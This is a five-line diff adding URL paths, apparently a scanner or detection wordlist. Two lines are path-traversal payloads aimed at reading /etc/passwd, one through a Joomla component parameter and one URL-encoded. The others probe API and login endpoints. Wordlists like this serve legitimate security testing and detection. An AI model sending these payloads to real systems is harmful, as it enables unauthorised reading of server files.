@@ -1,0 +1,5 @@
+/index.php?option=com_kif_nexus&controller=../../../../../../../../../etc/passwd
+/%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+/service/rest/swagger.json
+/login.php?secret=
+/service/rest/v1/repositories
